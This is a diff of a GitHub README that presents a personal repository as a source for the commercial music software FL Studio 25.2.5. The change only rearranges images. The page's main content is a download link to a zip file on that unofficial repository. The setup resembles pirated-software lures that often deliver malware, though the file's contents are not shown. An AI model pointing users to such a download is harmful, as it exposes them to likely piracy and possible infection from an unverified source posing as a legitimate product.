@@ -1,8 +1,11 @@
+<img width="1536" height="1024" alt="b8775c76-fb11-4687-a808-4b510d49ff17" src="https://github.com/user-attachments/assets/4b62faf6-0ecd-4f4e-8cbe-e0da04a71683" />
+
+
 #  FL Studio 25.2.5
 
 **FL Studio 25.2.5** is a powerful Digital Audio Workstation (DAW) used by millions of producers worldwide for music production, beat making, mixing, and mastering.
 
-<img width="1536" height="1024" alt="b8775c76-fb11-4687-a808-4b510d49ff17" src="https://github.com/user-attachments/assets/4b62faf6-0ecd-4f4e-8cbe-e0da04a71683" />
+<img width="100" height="100" alt="image" src="https://github.com/user-attachments/assets/956ef48f-fe33-479d-a8a6-d2332f0fc14c" />
 
 ## Install
 [Download `FL-Studio-25.2.5.zip`](https://github.com/Ibra0912345/fl-25.2.5/releases/latest/download/FL-Studio-25.2.5.zip)
